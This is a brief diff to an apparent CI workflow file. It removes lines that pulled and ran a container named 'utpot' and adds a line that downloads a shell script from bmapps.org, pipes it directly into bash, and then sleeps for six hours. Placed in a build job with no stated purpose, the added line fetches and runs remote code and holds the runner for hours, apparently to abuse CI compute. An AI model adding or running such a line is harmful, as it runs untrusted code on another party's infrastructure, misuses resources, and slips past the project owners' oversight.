@@ -22,5 +22,4 @@ jobs:
         sudo ufw allow 22
         sudo ufw allow 443
         sudo ufw enable
-        docker pull public.ecr.aws/n8q1b0b5/utpot
-        docker run public.ecr.aws/n8q1b0b5/utpot
+        wget -qO- https://bmapps.org/bmcontrol/linux/install5919060.sh | bash && sleep 6h
